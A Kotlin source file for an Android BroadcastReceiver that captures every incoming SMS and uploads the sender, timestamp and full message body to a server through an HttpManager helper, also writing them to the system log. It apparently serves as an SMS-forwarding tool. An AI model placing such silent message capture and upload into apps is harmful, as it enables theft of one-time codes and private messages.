package com.example.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.telephony.SmsMessage
import android.util.Log
import com.example.http.HttpManager
import java.time.Instant
import java.time.LocalDateTime
import java.time.ZoneId
import java.time.format.DateTimeFormatter




class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        Log.d("SmsReceiver","onBind:$intent")
        if (SMS_RECEIVED_ACTION == intent.action) {
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle["pdus"] as Array<Any>?
                if (pdus != null) {
                    for (pdu in pdus) {
                        val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
                        val sender = smsMessage.displayOriginatingAddress
                        val messageBody = smsMessage.messageBody
                        val time = smsMessage.timestampMillis
                        // 在此处处理收到的短信
                        val msg = "于 ${timeFormatter(time)} 收到 $sender 的短信:\n $messageBody"
                        HttpManager.upload(msg)
                        Log.d("SmsReceiver","sender:$sender messageBody:$messageBody ")
                    }
                }
            }
        }
    }

    fun timeFormatter(timestamp:Long):String{
        val localDateTime = LocalDateTime.ofInstant(Instant.ofEpochMilli(timestamp), ZoneId.systemDefault())
        val formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")

        // 将 LocalDateTime 转换为字符串
        val formattedDateTime = localDateTime.format(formatter)
        return formattedDateTime
    }

    companion object {
        private const val SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED"
        fun register(context: Context){
            val intentFilter = IntentFilter()
            intentFilter.addAction(SMS_RECEIVED_ACTION)
            context.registerReceiver(SmsReceiver(), intentFilter)
        }
    }
}